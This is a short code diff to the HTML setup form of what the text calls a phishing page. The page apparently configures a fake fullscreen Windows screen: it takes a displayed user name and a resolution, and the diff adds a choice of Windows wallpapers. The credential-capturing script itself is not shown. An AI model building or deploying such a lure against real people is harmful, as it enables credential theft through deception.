@@ -25,8 +25,15 @@ Now close the first page and make the phishing page fullscreen. Have fun!
 
 <form action="phish.php" target="_blank" method="GET">
 Name to display as Windows user: <input type="text" name="displayname"></br>
-Resolution Width:  <input type="text" id="rewidth" name="rewidth"> Does nothing</br>
-Resolution Height: <input type="text" id="reheight" name="reheight"> Also nothing</br>
+Resolution Width:  <input type="text" id="rewidth" name="rewidth"></br>
+Resolution Height: <input type="text" id="reheight" name="reheight"></br>
+Background Image: 	</br>
+					<input type="radio" name="background" value="url(images/def_background.jpg)" checked> Blue Windows Logo (Original size 1920x1200)<br>
+					<input type="radio" name="background" value="url(images/cave.jpg)"> Beach Cave (Original size 3840×2160)<br>
+					<input type="radio" name="background" value="url(images/mountainsee.png)"> Mountain see (Original size 1920x1200)<br>
+					<input type="radio" name="background" value="url(images/mountainbiker.jpg)"> Biker on mountain (Original size 1920x1200)<br>
+					<input type="radio" name="background" value="url(images/plainblue.jpg)"> Plain blue (the Win10 blue)<br>
+
 
 <script>
 		var screenheight = window.screen.height;
@@ -38,14 +45,7 @@ Resolution Height: <input type="text" id="reheight" name="reheight"> Also nothin
 </p>
 
 
-<button>Try it</button>
-
-<!-- <script>
-function myFunction() {
-  window.open("phish.php");
-}
-</script>
--->
+<button>Test yourself!</button>
 
 </body>
 </html>
